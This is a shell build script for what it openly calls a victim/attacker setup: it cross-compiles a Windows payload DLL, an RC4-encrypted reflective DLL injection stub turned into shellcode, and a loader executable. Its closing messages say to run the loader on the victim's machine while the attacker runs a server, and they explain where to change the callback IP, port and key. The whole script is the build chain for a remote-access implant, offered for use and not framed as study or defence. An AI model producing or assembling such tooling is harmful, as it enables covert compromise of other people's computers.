set -e
DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$DIR"

echo "[*] compiling payload.dll..."
i686-w64-mingw32-g++ -shared -m32 -o payload.dll payload.cpp -Wl,--out-implib,payload.lib -static-libgcc
echo "  $(wc -c < payload.dll) bytes"

echo "[*] compiling rdi_rc4 stub..."
i686-w64-mingw32-g++ -c rdi_rc4.cpp -o rdi_rc4.o -O1 -nostdlib -fno-stack-protector -fPIC -fno-plt -ffreestanding -fno-exceptions -fno-rtti -m32
i686-w64-mingw32-objcopy --only-section=.text -O binary rdi_rc4.o stub_rc4.bin
echo "  stub: $(wc -c < stub_rc4.bin) bytes"

echo "[*] building shellcode.bin..."
echo "[*] building shellcode.bin..."
python3 -c "
stub = open('stub_rc4.bin','rb').read()
open('shellcode.bin','wb').write(stub)
print(f'    stub={len(stub)} bytes')
"

echo "[*] compiling loader.exe..."
i686-w64-mingw32-g++ -o loader.exe loader.cpp -static
echo "  $(wc -c < loader.exe) bytes"

echo ""
echo "[+] done!"
echo "  victim : copy loader.exe + shellcode.bin to same folder, run loader.exe"
echo "  attacker: python3 server.py"
echo ""
echo "  to change key: edit RC4_KEY in rdi_rc4.cpp AND KEY in server.py"
echo "  to change IP : edit addr.sin_addr / addr.sin_port in rdi_rc4.cpp"